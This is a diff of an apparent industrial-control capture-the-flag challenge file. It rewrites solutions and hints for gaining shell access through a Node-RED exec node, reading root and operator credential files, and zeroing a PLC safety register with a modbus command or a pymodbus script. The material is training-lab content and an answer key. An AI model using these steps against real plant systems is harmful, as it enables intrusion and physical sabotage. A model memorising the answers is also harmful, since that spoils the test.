@@ -24,16 +24,22 @@
       "solution": "1. Connect to Node-RED HMI editor: http://192.168.100.10:1880/\n2. Drag inject, exec, and debug nodes onto the canvas and wire them: inject -> exec -> debug.\n3. Configure the exec node command field with: cat /root/flag.txt\n4. Click Deploy and click the inject node's trigger button. Read the flag in the Debug panel.\n5. To locate credentials, change the exec node command field to: cat /home/debian/ews_credentials.txt and trigger it.",
       "hints": [
         {
-          "title": "Graphical RCE Node Selection",
-          "content": "Under the 'advanced' tab on the left node-palette, locate the 'exec' node. This node spawns a system shell process. Wire an 'inject' node to its input, and a 'debug' node to its top output. Double-click the 'exec' node and input 'cat /root/flag.txt' in the Command field. Click Deploy, then click the trigger button on the inject node to view the flag in the Debug panel on the right.",
+          "title": "Node-RED Shell Execution Concept",
+          "content": "Look at the left-hand node palette under the 'advanced' category for the 'exec' node, which executes system shell commands. You can trigger it using an 'inject' node, and view its stdout using a 'debug' node wired to the top output port of the exec node.",
           "hint_penalty": 0,
           "order": 0
         },
         {
-          "title": "Credential Hunting",
-          "content": "Plant operators frequently save configurations or backups in home folders. Create a new Node-RED exec node executing 'ls -la /home/debian/' and trigger it. You will see a file named 'ews_credentials.txt'. Read its contents using 'cat /home/debian/ews_credentials.txt' to extract the credentials for the next stage.",
+          "title": "Finding Operator Credentials",
+          "content": "Plant operators frequently save backup configurations or notes in their home directories. Use the shell executor to list the contents of the `/home/debian/` directory to check for any credentials files.",
           "hint_penalty": 0,
           "order": 1
+        },
+        {
+          "title": "Exact Foothold Commands",
+          "content": "1. To get the flag: Set the exec command to `cat /root/flag.txt` and trigger it.\n2. To get the credentials: Set the exec command to `cat /home/debian/ews_credentials.txt` and trigger it.",
+          "hint_penalty": 0,
+          "order": 2
         }
       ]
     },
@@ -76,20 +82,20 @@
       "solution": "1. Run the Modbus write command: modbus 192.168.20.10 0=0\n2. Read the safety override flag file: cat /var/log/safety_override.txt",
       "hints": [
         {
-          "title": "Modbus CLI Syntax",
-          "content": "The pre-installed `modbus` CLI utility lets you execute Modbus commands simply: `modbus <PLC_IP> <Register_Address>=<Value>`. To write 0 to register 0 on the target, run: `modbus 192.168.20.10 0=0`.",
+          "title": "Modbus CLI Tool Concept",
+          "content": "The pre-installed `modbus` CLI utility lets you execute Modbus commands simply: `modbus <PLC_IP> <Register_Address>=<Value>`. Note that holding registers are zero-indexed, and we are targeting register 0.",
           "hint_penalty": 0,
           "order": 0
         },
         {
-          "title": "Alternative Python Modbus Scripting",
-          "content": "You can write a custom Python script using the installed `pymodbus` package:\n```python\nfrom pymodbus.client import ModbusTcpClient\nclient = ModbusTcpClient('192.168.20.10')\nclient.connect()\nclient.write_register(0, 0) # Writes 0 to register 0\nclient.close()\n```",
+          "title": "Locating the Safety Log File",
+          "content": "The safety monitor sidecar writes the flag file to the EWS system log directory (`/var/log/`). Look for a text file referencing 'safety' or 'override' in that folder.",
           "hint_penalty": 0,
           "order": 1
         },
         {
-          "title": "Safety Override Log Path",
-          "content": "Once the register is zeroed, the safety monitor daemon instantly writes the flag to `/var/log/safety_override.txt`. Run `cat /var/log/safety_override.txt` to display the flag.",
+          "title": "Exact Sabotage Commands",
+          "content": "1. Write zero to register 0: `modbus 192.168.20.10 0=0`\n2. Read the validation flag: `cat /var/log/safety_override.txt`\n\n*Alternative Python Script:* \n```python\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('192.168.20.10')\nc.connect()\nc.write_register(0, 0)\nc.close()\n```",
           "hint_penalty": 0,
           "order": 2
         }
